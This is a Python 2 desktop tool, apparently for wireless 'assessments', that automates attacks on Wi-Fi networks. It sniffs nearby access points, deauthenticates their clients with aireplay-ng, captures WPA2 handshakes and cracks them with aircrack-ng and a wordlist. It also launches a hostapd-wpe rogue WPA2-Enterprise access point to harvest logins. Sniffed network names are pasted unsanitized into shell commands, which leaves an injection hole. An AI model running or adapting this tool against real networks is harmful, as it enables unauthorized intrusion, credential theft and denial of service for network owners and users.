import os
import threading
import time
import wx
import wx.lib.scrolledpanel
from random import randint
from scapy.all import *
from threading import Thread
from wx.lib.pubsub import pub as Publisher

import wless_commands

wpa2execute = True
wizardrun = True

global out, err

out, err = '', ''


def wpa2_psk_hack(ssid, bssid, channel):
    g_ssid = ssid
    g_bssid = bssid
    g_channel = channel

    def exe1():
        os.system(
            'gnome-terminal -x airodump-ng -w ./Modules/capture/"' + g_ssid + '" --essid "' + g_ssid + '" --bssid ' + g_bssid + ' -c ' + str(
                g_channel) + ' mon0 &')
        global out, err, wpa2execute
        os.system('gnome-terminal -x aireplay-ng --deauth 20 -e "' + ssid + '" -a ' + bssid + ' mon0 &')
        time.sleep(4)
        while wpa2execute:

            os.system(
                "aircrack-ng ./Modules/capture/'" + g_ssid + "*.cap' -e '" + g_ssid + "' -b " + g_bssid + " -w /usr/share/wordlists/fasttrack.txt > ./Modules/Logs/wizard_ssid.tmp &")
            # ~ print "aircrack-ng ./Modules/capture/"+g_ssid+"*.cap -e "+g_ssid+" -b "+g_bssid+ " -w /usr/share/wordlists/fasttrack.txt"
            handshake_test = ''
            myfile = open('./Modules/Logs/wizard_ssid.tmp', 'r').read()
            if 'Passphrase' in myfile:

                os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
                os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
                os.system("echo '' > ./Modules/Logs/wizard_ssid.tmp")

                global wpa2execute

                wpa2execute = False
                break
            # ~ exit
            else:
                print 'capture not found'
                time.sleep(10)

    wpa2thread = threading.Thread(target=exe1)
    wpa2thread.start()
    wpa2thread.join()


def wpa2_ent_wizard(iface, ssid):
    configuration = """interface=%s
driver=nl80211
ssid=%s
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=6
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""" % (iface, ssid)

    hostapd_conf = open('./Modules/hostapd-wpe.conf-wizard', 'wb')
    hostapd_conf.write(configuration)
    hostapd_conf.close()
    os.system("/sbin/ldconfig -v")
    os.system("gnome-terminal -x radiusd -X &")
    os.system("/usr/local/etc/raddb/certs/bootstrap &")

    time.sleep(300)

    os.system("gnome-terminal -x hostapd ./Modules/hostapd-wpe.conf-wizard &")
    time.sleep(10)
    os.system("kill `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
    os.system("kill `ps aux | grep hostapd | head -1 | awk '{print $2}'`")


refresh_threader = True
ssids = set()
tssid = None
found_probe_request = []
found_client_mac = []
ssid_dictionary = {}
ssid_channel_dictionary = {}
mylist = set()
essid_details = set()
probe_dict = {}
essid_channel = {}

user_select_ssid = []

essid = None
channel = None
encryption = None
bssid = None
threadder = False
new_ssid = []

probeClient = None
probeSSID = None

connClient = None
connAP = None
connAPMAC = None

user_attack_select = {}

mac_dict = {}


def match_mac(string):
    match_mac = re.compile(ur'(?:[0-9a-fA-F]:?){12}')
    regex_match_mac = re.search(match_mac, string)
    return regex_match_mac.group(0)


def match_channel(string):
    match_channel = re.compile(ur'\[Channel\]-> [0-9]{1,2}')
    regex_match_channel = re.search(match_channel, string)
    return str(regex_match_channel.group(0)).replace('[Channel]->', '')


def match_ssid(string):
    match_ssid = re.compile(ur'([ESSID](.*?)*:)')
    regex_match_ssid = re.search(match_ssid, string)
    match_ssid2 = re.compile(ur'\'.*\'')
    regex_match_ssid_real = re.search(match_ssid2, str(regex_match_ssid.group(0)))
    return str(regex_match_ssid_real.group(0)).replace('\'', '')


def wpa2_psk_attack(essid, bssid, channel):
    os.system("iwconfig mon0 channel " + str(channel))
    command = (
    "gnome-terminal -x airodump-ng --essid '%s' --bssid '%s' --write './Modules/capture/%s_crack' mon0 -c %s &" % (
    essid, bssid, essid, channel))
    os.system(command)


with open('./Modules/mac_addresses.lst', 'r') as f:
    for i in f:
        tmp = i.split('=')
        mac_dict[str(tmp[0]).strip()] = str(tmp[1]).strip()

############
found_probes = ''
found_ssids = ''
found_connected_clients = ''


############


class MySniffer(Thread):
    def __init__(self):

        Thread.__init__(self)
        global packet_capture
        self.start()

    def scapyStopper(self, x):
        return packet_capture == False

    wlan_ifaces = wless_commands.get_monitoring_interfaces()
    if not wlan_ifaces:
        wx.MessageBox('Failed to get a wireless interface. \nTry to resinsert USB wireless card', 'Warning/Error',
                      wx.ICON_ERROR | wx.ICON_INFORMATION)

    mon_iface = wlan_ifaces[0]
    os.system('iw dev ' + mon_iface + ' interface add mon0 type monitor')
    os.system('ifconfig mon0 up')

    def channelHopper():
        while threadder:
            rChannel = randint(1, 14)
            os.system('iwconfig mon0 channel %d' % rChannel)

    def run(self):
        sniff(iface='mon0', prn=self.packet_sniffer, stop_filter=self.scapyStopper)

    def stopper_flag(self):
        global threadder
        threadder = False
        return False

    def stopper(self):
        sniff(iface='mon0', prn=self.packet_sniffer, stop_filter=self.stopper_flag)

    def packet_sniffer(self, pkt):

        if pkt.haslayer(Dot11Beacon):
            ##################### WIFI SNIFFER WITH ENCRYPTION #################
            temp = pkt

            while temp:
                ssid_details = []
                global ssid_dictionary
                global ssid_channel_dictionary

                temp = temp.getlayer(Dot11Elt)
                cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}" "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')

                if temp and temp.ID == 0 and (pkt.addr3 not in ssids):
                    global essid
                    global bssid
                    global ssid_dictionary
                    global ssid_channel_dictionary
                    global channel

                    # ~ if essid.decode('ascii'):
                    if essid:
                        essid = pkt.info
                        # ~ print essid
                        ssid_dictionary[bssid] = repr(essid)
                        if not essid:
                            essid = 'Unknown'

                    else:
                        essid = 'Unknown'
                        ssid_dictionary[bssid] = repr(essid)

                    bssid = pkt.addr3
                    ssid_dictionary[bssid] = repr(essid)



                elif temp and temp.ID == 3:
                    # ~ print '****'
                    # ~ print ord(temp.info)
                    global channel
                    global ssid_channel_dictionary

                    try:
                        channel = ord(temp.info)
                    except:
                        channel = ''

                    ssid_channel_dictionary[bssid] = repr(essid) + '-' + str(channel)

                elif temp and temp.ID == 221:
                    encryption = 'WPA/WPA2'

                    global tssid, mac_dict

                    try:
                        manufacturer = str(bssid[0:8]).replace(':', '-').upper()
                        manufactuerer_id = str(mac_dict[manufacturer])
                    except:

                        manufactuerer_id = 'Unknown device'
                    # ~
                    tssid = str('[MAC Addr]-> ' + str(bssid) + ' : [ESSID]-> ' + repr(essid) + ' : [Channel]-> ' + str(
                        channel) + ' \t\t: [Encr]-> ' + str(encryption) + '\t :[Manufacturer]-> ' + manufactuerer_id)
                    tempSSID2 = str(str(bssid) + '-' + repr(essid) + '-' + str(channel))
                    ssid_dictionary[bssid] = essid
                    # ~ print ssid_dictionary
                    ######### write to file #######


                    #
                    if tssid not in new_ssid:

                        global found_ssids

                        new_ssid.append(tssid)
                        found_ssids = tssid

                        ######## write to file #######
                        try:

                            with open('access_list.txt', 'a') as f:
                                f.write(tssid + '\n')
                        except:
                            print 'not printable'
                        with open('deauthSSID.txt', 'a') as g:
                            g.write(tempSSID2 + ',')
                        ######## write to file #######

                    break

                temp = temp.payload
            ##################### WIFI SNIFFER WITH ENCRYPTION #################


class SnifferGUI(wx.Frame):
    def __init__(self, parent, title):
        super(SnifferGUI, self).__init__(parent, title=title, size=(1120, 1400))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):

        # ~ self.scroll = wx.ScrolledWindow(self, -1)


        global SSID_textControl
        global ConnectionsTextControl
        global probeTextControl

        panel = wx.lib.scrolledpanel.ScrolledPanel(self, -1, size=(1110, 1400), pos=(0, 28))  # wx.Panel(self)
        panel.SetBackgroundColour('#98a3b2')
        panel.SetupScrolling()

        menubar = wx.MenuBar()
        fileMenu = wx.Menu()
        fileMenu2 = wx.Menu()
        fileMenu3 = wx.Menu()

        fitem = fileMenu.Append(-1, 'Start Sniffer', 'Start sniffer')
        fitem2 = fileMenu.Append(-1, 'Stop Sniffer', 'Stop Sniffer')
        fitem3 = fileMenu.Append(-1, 'Quit Sniffer', 'Quit Sniffer')
        fitem4 = fileMenu2.Append(-1, 'Configure Wizard', 'Configure Wizard')

        fitem5 = fileMenu3.Append(-1, 'Stop Attack', 'Stop Attack')

        menubar.Append(fileMenu, 'Scanner')
        menubar.Append(fileMenu2, 'Wizard Settings')
        menubar.Append(fileMenu3, 'Stop Current Attack')
        self.SetMenuBar(menubar)

        self.Bind(wx.EVT_MENU, self.OnStartSniff, fitem)
        self.Bind(wx.EVT_MENU, self.OnStopSniff, fitem2)
        self.Bind(wx.EVT_MENU, self.onQuitApp, fitem3)
        self.Bind(wx.EVT_MENU, self.onAttack, fitem4)

        self.Bind(wx.EVT_MENU, self.onStopAttack, fitem5)

        self.panel_new = panel

        self.on_timer()

    def onAttack(self, event):
        frame = AttackFrame(None, 'Wireless Scanner')
        frame.Show()

    def onStopAttack(self, event):
        os.system("kill `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep airodump-ng | head -1 | awk '{print $2}'`")
        os.system("kill `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")

    def OnStopSniff(self, event):
        global packet_capture
        global refresh_threader
        global threadder

        threadder = False
        packet_capture = False
        refresh_threader = False

    def OnStartSniff(self, event):
        global packet_capture
        global refresh_threader
        global threadder
        threadder = True
        refresh_threader = True

        packet_capture = True

        MySniffer()

    def onQuitApp(self, event):

        os.system('echo ""> access_list.txt')
        os.system("kill `ps aux | grep wifi-sniffer-finalv10 | head -1 | awk '{print $2}'`")
        self.Close()

    def channelHopper2(self):

        while threadder:
            rChannel = randint(1, 14)
            os.system('iwconfig mon0 channel %d' % rChannel)

    def on_timer(self):
        global ssid_list

        rChannel = randint(1, 14)
        os.system('iwconfig mon0 channel %d' % rChannel)
        os.system('touch access_list.txt')

        ssid_list = open('access_list.txt', 'r').readlines()
        pos = 0

        def onSelectCheckbox(event):

            if event.IsChecked():
                global user_select_ssid
                global essid_channel
                user_select_ssid = event.GetEventObject().GetLabel()
                user_attack_select[match_mac(user_select_ssid)] = match_ssid(user_select_ssid)
                essid_channel[match_mac(user_select_ssid)] = int(match_channel(user_select_ssid))


            # ~ print user_attack_select

        for i in ssid_list:

            if len(str(i)) > 10:
                cb = wx.CheckBox(self.panel_new, label=str(i), pos=(10, pos))
                cb.Bind(wx.EVT_CHECKBOX, onSelectCheckbox, cb)

            pos += 40

        if refresh_threader == True:
            wx.CallLater(2000, self.on_timer)

            rChannel = randint(1, 14)
            os.system('iwconfig mon0 channel %d' % rChannel)


class AttackFrame(wx.Frame):
    def __init__(self, parent, title):
        super(AttackFrame, self).__init__(parent, title=title, size=(900, 700))

        self.InitUI()
        self.Centre()
        self.Show()

    def InitUI(self):

        panel = wx.lib.scrolledpanel.ScrolledPanel(self, -1, size=(900, 700))  # wx.Panel(self)
        panel.SetBackgroundColour('#98a3b2')
        panel.SetupScrolling()

        menubar = wx.MenuBar()
        fileMenu = wx.Menu()
        attackm = fileMenu.Append(-1, 'Start Attack', 'Start Attack')
        menubar.Append(fileMenu, 'Attack')
        self.SetMenuBar(menubar)

        font = wx.Font(25, wx.DECORATIVE, wx.ITALIC, wx.NORMAL)

        self.Attack_vectors = wx.StaticText(panel, wx.ID_ANY, label="\tFollowing Targets are defined", pos=(20, 20))
        self.Attack_vectors.SetFont(font)

        attack_string = """
			Type of attacks to be performed
			
						WPA2 
						WPA2 Enterprise Attack
		"""

        self.target_list = wx.StaticText(panel, wx.ID_ANY, label="", pos=(20, 70))
        pos = 70
        for key, value in user_attack_select.iteritems():
            self.target_list = wx.StaticText(panel, wx.ID_ANY, label=key + " On channel " + str(
                essid_channel[key]) + '  <--->  ' + value + attack_string, pos=(20, pos))
            pos += 220

        self.Bind(wx.EVT_MENU, self.wizard_attack, attackm)

    def wizard_attack(self, event):

        from thread_test import wpa2_attack

        # ~ print 'Started the attack'




        for key, value in user_attack_select.iteritems():
            global wpa2execute
            wpa2execute = True
            attack_pretext = 'started PSK attack on ' + str(value) + ':' + str(key) + ':' + str(
                essid_channel[key]) + '\n'
            tester = wpa2_attack(str(value), str(key), str(essid_channel[key]))
            # ~ print attack_pretext
            # ~ tester = wpa2_attack(str(value), str(key),str(essid_channel[key])
            # ~ check_status = open('./Modules/Logs/assessment_logs.txt','r').read()



            log_file = open('./Modules/Logs/assessment_logs.txt', 'ab+')
            log_file.write(attack_pretext)
            log_file.close()

            if wpa2execute:

                # ~ wpa2_psk_hack(value, key,essid_channel[key])
                tester.wpa2_psk_hack(self)

                os.system("iwconfig mon0 channel " + str(essid_channel[key]))
                attack_text = "WPA2 Attack for SSID: " + str(
                    value) + "is performed \nThe capture with handshake is stored here: ./capture/" + str(
                    value) + ".cap\n"
                log_file = open('./Modules/Logs/assessment_logs.txt', 'ab+')
                log_file.write(attack_text)
                log_file.close()
            # ~ wpa2execute = True
            # ~ timer.sleep(10)

            else:

                wpa2execute = True

            wlan_ifaces = wless_commands.get_monitoring_interfaces()
            if not wlan_ifaces:

                wx.MessageBox('Failed to get a wireless interface. \nTry to resinsert USB wireless card',
                              'Warning/Error', wx.ICON_ERROR | wx.ICON_INFORMATION)

            else:
                mon_iface = wlan_ifaces[0]
                wpa2_ent_wizard(mon_iface, value)


def main():
    packet_capture = False

    app = wx.App(False)
    frame = SnifferGUI(None, 'Wireless Scanner')
    app.MainLoop()


# ~ if __name__ == '__main__':
main()
